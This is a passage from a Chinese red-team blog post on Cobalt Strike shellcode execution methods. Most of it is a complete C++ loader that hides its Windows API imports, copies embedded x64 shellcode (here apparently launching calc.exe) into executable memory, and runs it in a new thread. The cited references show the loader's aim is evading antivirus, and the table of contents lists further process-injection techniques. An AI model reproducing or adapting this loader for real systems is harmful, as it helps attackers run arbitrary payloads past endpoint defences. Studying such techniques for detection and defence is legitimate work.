<span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025110328965.png" data-fancybox="true"/></div></div>

<h5 id="简易版"><a href="#简易版" class="headerlink" title="简易版"></a>简易版</h5><p>该版本没有实现动态获取<code>GetProcAddress</code>函数地址, 而是直接使用并通过<code>GetProcAddress</code>获取其他<code>Windows Api</code>函数地址.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">// VirtuallAlloc</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* lpVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpAddress, <span class="comment">// region to reserve orcommit</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwSize, <span class="comment">// size of region</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD flAllocationType, <span class="comment">// type of allocation</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD flProtect <span class="comment">// type of accessprotection</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="comment">// CreateThread</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* hCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwStackSize, <span class="comment">//initial stack size</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress, <span class="comment">// threadfunction</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter, <span class="comment">// threadargument</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags, <span class="comment">// creation option</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD lpThreadId <span class="comment">// thread identifier</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="comment">// WaitForSingleObject</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* dwWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE hHandle, <span class="comment">// handle to object</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwMilliseconds <span class="comment">// time-out interval</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="comment">// RtlMoveMemory</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span><span class="params">(WINAPI* vRtlMoveMemory)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN VOID UNALIGNED* Destination,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN CONST VOID UNALIGNED* Source,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN SIZE_T Length</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取函数地址并赋值给对应申明的函数</span></span><br><span class="line">    hCreateThread myCT = (hCreateThread)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;Kernel32.dll&quot;</span>),</span><br><span class="line">        <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">    lpVirtualAlloc myVA = (lpVirtualAlloc)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;Kernel32.dll&quot;</span>),</span><br><span class="line">        <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">    dwWaitForSingleObject myWFSO =</span><br><span class="line">        (dwWaitForSingleObject)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>),</span><br><span class="line">            <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line">    vRtlMoveMemory mymemmove =</span><br><span class="line">        (vRtlMoveMemory)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;RtlMoveMemory&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 申请内存</span></span><br><span class="line">    LPVOID lpVA = <span class="built_in">myVA</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 拷贝数据到内存</span></span><br><span class="line">    <span class="built_in">mymemmove</span>(lpVA, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 创建线程</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">myCT</span>(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)lpVA,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 等待线程运行</span></span><br><span class="line">    <span class="built_in">myWFSO</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">    <span class="comment">// 关闭线程</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<div class="article-footer fs14">
    <section id="references">
      <div class="header"><span>参考资料</span></div>
      <div class="body">
        <ul>
        <li class="post-title">
          <p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode">finding-kernel32-base-and-function-addresses-in-shellcode</a></p>

        </li>
        
        <li class="post-title">
          <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12035">通过隐藏导入表的方式规避杀软</a></p>

        </li>
        
        <li class="post-title">
          <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/cSZTzVSbUExF9A-7TsmWvw">深度了解”VirtualAlloc免杀”背后的技术</a></p>

        </li>
        
        <li class="post-title">
          <p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-266678.htm">PEB结构：获取模块kernel32基址技术及原理分析</a></p>

        </li>
        </ul>
      </div>
    </section>
    
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    
    <section id="share">
      <div class="header"><span>分享文章</span></div>
      <div class="body">
        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/11/15/d30120c3/" /></div>
        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/11/15/d30120c3/&title=CS-高级执行方式 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071300223.png&summary=
    总字符数: 68.84K 
    
    
    代码: 57.72K, 文本: 5.79K
    
    
    预计阅读时间: 4.60 小时
    
    

线程劫持
线程劫持是一种无需创建新线程就可..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=CS-高级执行方式 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/11/15/d30120c3/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
        
        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/11/15/d30120c3/"/>
        </div>
        
      </div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/11/09/cb5559ca/">VulnHub-MoriartyCorp</a></div></section></div>

<div class="related-wrap" id="related-posts">
    <section class='header'>
      <div class='title cap theme'>您可能感兴趣的文章</div>
    </section>
    <section class='body'>
    <div class="related-posts"><a class="item" href="/2024/10/27/77c80f0f/" title="CS-C语言总结"><span class="title">CS-C语言总结</span></a><a class="item" href="/2024/09/25/3c3f9499/" title="CS-Cobalt Strike修改特征"><span class="title">CS-Cobalt Strike修改特征</span></a><a class="item" href="/2024/09/24/3c3f9499/" title="CS-Cobalt Strike必备知识"><span class="title">CS-Cobalt Strike必备知识</span></a><a class="item" href="/2024/11/04/fe2980d6/" title="CS-ShellCode加载器"><span class="title">CS-ShellCode加载器</span></a><a class="item" href="/2024/09/26/da146604/" title="CS-云函数隐匿C2"><span class="title">CS-云函数隐匿C2</span></a></div></section></div>


  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>快来参与讨论吧~</p>

    </section>
    <section class='body cmt-body waline'>
      

<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>

    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
  <!--不蒜子计数器-->
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
  <br>
  <span id="runtime_span"></span>
  <script type="text/javascript">
    // JavaScript for showing runtime here
  </script>
</center>
<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
</div>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E5%8A%AB%E6%8C%81"><span class="toc-text">线程劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-text">线程上下文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%8E%A2Create-Thread"><span class="toc-text">再探Create Thread</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5-CreateRemoteThread"><span class="toc-text">远程线程注入-CreateRemoteThread</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%9B%E7%A8%8B"><span class="toc-text">什么是进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="toc-text">注入进程的步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-text">代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B"><span class="toc-text">打开目标进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BAShellCode%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98"><span class="toc-text">为ShellCode分配内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86ShellCode%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98"><span class="toc-text">将ShellCode写入内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%9D%A5%E6%89%A7%E8%A1%8CShellCode"><span class="toc-text">创建一个远程线程来执行ShellCode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%89%E5%BE%85%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E5%AE%8C%E6%88%90%E6%89%A7%E8%A1%8C%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8C%E6%B8%85%E7%90%86"><span class="toc-text">等待远程线程完成执行，然后进行清理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#APC%E6%B3%A8%E5%85%A5-QueueUserAPC"><span class="toc-text">APC注入-QueueUserAPC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFAPC"><span class="toc-text">什么是APC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFAPC%E6%B3%A8%E5%85%A5"><span class="toc-text">什么是APC注入?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFAPC%E9%98%9F%E5%88%97%EF%BC%9F"><span class="toc-text">什么是APC队列？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#QueueUserAPC"><span class="toc-text">QueueUserAPC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E7%BA%BF%E7%A8%8B%E7%BD%AE%E4%BA%8E%E5%8F%AF%E8%AD%A6%E5%91%8A%E7%8A%B6%E6%80%81"><span class="toc-text">将线程置于可警告状态</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Sleep"><span class="toc-text">Sleep</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SleepEx"><span class="toc-text">SleepEx</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WaitForSingleObject"><span class="toc-text">WaitForSingleObject</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MsgWaitForMultipleObjects"><span class="toc-text">MsgWaitForMultipleObjects</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SignalObjectAndWait"><span class="toc-text">SignalObjectAndWait</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%82%E5%81%9C%E7%BA%BF%E7%A8%8B"><span class="toc-text">暂停线程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0APC%E6%B3%A8%E5%85%A5"><span class="toc-text">如何实现APC注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Explorer%E8%BF%9B%E7%A8%8B%E4%B8%8B%E7%9A%84%E6%AF%8F%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%B0%86shellcode%E9%80%9A%E8%BF%87APC%E6%B3%A8%E5%85%A5%E5%88%B0%E6%AF%8F%E4%B8%AA%E7%BA%BF%E7%A8%8B%E4%B8%AD"><span class="toc-text">获取Explorer进程下的每个线程,将shellcode通过APC注入到每个线程中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%89%E8%B5%B7notepad-%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87APC%E6%B3%A8%E5%85%A5%E5%B0%86shellcode%E6%B3%A8%E5%85%A5%E5%88%B0notepad%E7%BA%BF%E7%A8%8B%E4%B8%AD"><span class="toc-text">拉起notepad,然后通过APC注入将shellcode注入到notepad线程中</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7APC%E6%B3%A8%E5%85%A5-Early-Bird%E6%B3%A8%E5%85%A5"><span class="toc-text">高级APC注入-Early Bird注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFEarly-Bird%E6%B3%A8%E5%85%A5"><span class="toc-text">什么是Early Bird注入?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B-%E5%9C%A8%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%B8%BB%E7%BA%BF%E7%A8%8B%E5%88%9D%E5%A7%8B%E5%8C%96%E5%89%8D%E8%BF%9B%E8%A1%8CAPC%E6%B3%A8%E5%85%A5"><span class="toc-text">新建一个进程,在进程的主线程初始化前进行APC注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B-%E5%9C%A8%E8%BF%9B%E7%A8%8B%E5%86%85%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%82%E8%B5%B7%E7%9A%84%E7%BA%BF%E7%A8%8B-%E5%BE%80%E8%BF%99%E4%B8%AA%E7%BA%BF%E7%A8%8B%E5%86%85%E6%8F%92%E5%85%A5APC%E6%B3%A8%E5%85%A5-%E9%9A%8F%E5%90%8E%E6%81%A2%E5%A4%8D%E8%BF%9B%E7%A8%8B"><span class="toc-text">新建一个进程,在进程内创建一个挂起的线程,往这个线程内插入APC注入,随后恢复进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B-%E5%9C%A8%E8%BF%9B%E7%A8%8B%E5%86%85%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%82%E8%B5%B7%E7%9A%84%E7%BA%BF%E7%A8%8B-%E5%BE%80%E8%BF%99%E4%B8%AA%E7%BA%BF%E7%A8%8B%E5%86%85%E6%8F%92%E5%85%A5APC%E6%B3%A8%E5%85%A5-%E5%88%A9%E7%94%A8%E6%9C%AA%E8%AE%B0%E5%BD%95%E7%9A%84ntdll%E4%B8%AD%E7%9A%84NtTestAlert%E6%89%A7%E8%A1%8CShellcode-%E9%9A%8F%E5%90%8E%E6%81%A2%E5%A4%8D%E8%BF%9B%E7%A8%8B"><span class="toc-text">新建一个进程,在进程内创建一个挂起的线程,往这个线程内插入APC注入,利用未记录的ntdll中的NtTestAlert执行Shellcode,随后恢复进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%B7%B2%E6%9C%89%E8%BF%9B%E7%A8%8B%E5%86%85%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%82%E8%B5%B7%E7%9A%84%E7%BA%BF%E7%A8%8B-%E5%BE%80%E8%BF%99%E4%B8%AA%E7%BA%BF%E7%A8%8B%E5%86%85%E6%8F%92%E5%85%A5APC%E6%B3%A8%E5%85%A5-%E9%9A%8F%E5%90%8E%E6%81%A2%E5%A4%8D%E8%BF%9B%E7%A8%8B"><span class="toc-text">在已有进程内创建一个挂起的线程,往这个线程内插入APC注入,随后恢复进程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SHE%E7%BB%93%E6%9E%84%E5%8C%96%E5%BC%82%E5%B8%B8%E6%89%A7%E8%A1%8C-SEH"><span class="toc-text">SHE结构化异常执行-SEH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NtTestAlert"><span class="toc-text">NtTestAlert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E8%BF%90%E8%A1%8C"><span class="toc-text">回调函数运行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EnumDateFormatsA"><span class="toc-text">EnumDateFormatsA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EnumUILanguages"><span class="toc-text">EnumUILanguages</span></a></li><li 